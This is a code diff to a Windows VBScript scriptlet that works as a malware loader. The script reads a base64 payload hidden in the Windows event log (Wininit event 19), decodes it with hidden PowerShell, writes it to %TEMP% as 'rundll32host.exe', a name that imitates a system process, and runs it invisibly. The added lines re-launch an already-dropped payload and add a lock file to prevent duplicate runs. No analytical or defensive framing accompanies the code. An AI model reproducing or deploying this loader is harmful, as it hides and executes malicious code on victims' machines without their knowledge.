@@ -4,16 +4,45 @@ On Error Resume Next
 
 Dim objShell
 Set objShell = CreateObject("WScript.Shell")
+Dim objFSO
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+Dim tempDir
+tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
+Dim lockFile
+lockFile = tempDir & "\persist_running.tmp"
+Dim peFile
+peFile = tempDir & "\rundll32host.exe"
+
+If objFSO.FileExists(peFile) Then
+    Dim fCheck
+    Set fCheck = objFSO.GetFile(peFile)
+    If fCheck.Size > 0 Then
+        objShell.Run peFile, 0, False
+        WScript.Quit
+    End If
+End If
+
+If objFSO.FileExists(lockFile) Then WScript.Quit
+Dim lockStream
+Set lockStream = objFSO.CreateTextFile(lockFile, True)
+lockStream.Close
 
 Dim objWMIService
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-If Err.Number <> 0 Then WScript.Quit
+If Err.Number <> 0 Then
+    objFSO.DeleteFile lockFile, True
+    WScript.Quit
+End If
 
 Dim colEvents
 Set colEvents = objWMIService.ExecQuery( _
     "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Microsoft-Windows-Wininit' AND EventCode = 19 " & _
     "ORDER BY TimeGenerated DESC")
-If Err.Number <> 0 Then WScript.Quit
+If Err.Number <> 0 Then
+    objFSO.DeleteFile lockFile, True
+    WScript.Quit
+End If
 
 Dim eventMessage
 eventMessage = ""
@@ -32,7 +61,10 @@ For Each objEvent In colEvents
     Err.Clear
 Next
 
-If Len(eventMessage) = 0 Then WScript.Quit
+If Len(eventMessage) = 0 Then
+    objFSO.DeleteFile lockFile, True
+    WScript.Quit
+End If
 
 objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
     "$b=[Convert]::FromBase64String('" & eventMessage & "');" & _
@@ -40,5 +72,7 @@ objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command
     "$p=$env:TEMP+'\rundll32host.exe';" & _
     "[IO.File]::WriteAllBytes($p,$b);" & _
     "Start-Process $p -WindowStyle Hidden""", 0, True
+
+objFSO.DeleteFile lockFile, True
 </script>
 </scriptlet>
